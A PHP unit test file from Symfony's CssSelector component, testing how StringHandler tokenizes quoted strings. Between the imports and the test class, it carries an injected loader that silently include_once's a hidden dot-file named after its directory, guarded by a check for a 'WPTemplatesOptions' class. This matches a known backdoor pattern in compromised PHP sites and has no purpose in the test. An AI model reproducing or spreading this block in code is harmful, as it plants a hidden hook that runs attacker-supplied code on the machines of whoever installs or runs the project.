<?php

/*
 * This file is part of the Symfony package.
 *
 * (c) Fabien Potencier <fabien@symfony.com>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Symfony\Component\CssSelector\Tests\Parser\Handler;

use Symfony\Component\CssSelector\Parser\Handler\StringHandler;
use Symfony\Component\CssSelector\Parser\Token;
use Symfony\Component\CssSelector\Parser\Tokenizer\TokenizerEscaping;
use Symfony\Component\CssSelector\Parser\Tokenizer\TokenizerPatterns;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class StringHandlerTest extends AbstractHandlerTest
{
    public function getHandleValueTestData()
    {
        return [
            ['"hello"', new Token(Token::TYPE_STRING, 'hello', 1), ''],
            ['"1"', new Token(Token::TYPE_STRING, '1', 1), ''],
            ['" "', new Token(Token::TYPE_STRING, ' ', 1), ''],
            ['""', new Token(Token::TYPE_STRING, '', 1), ''],
            ["'hello'", new Token(Token::TYPE_STRING, 'hello', 1), ''],

            ["'foo'bar", new Token(Token::TYPE_STRING, 'foo', 1), 'bar'],
        ];
    }

    public function getDontHandleValueTestData()
    {
        return [
            ['hello'],
            ['>'],
            ['1'],
            [' '],
        ];
    }

    protected function generateHandler()
    {
        $patterns = new TokenizerPatterns();

        return new StringHandler($patterns, new TokenizerEscaping($patterns));
    }
}
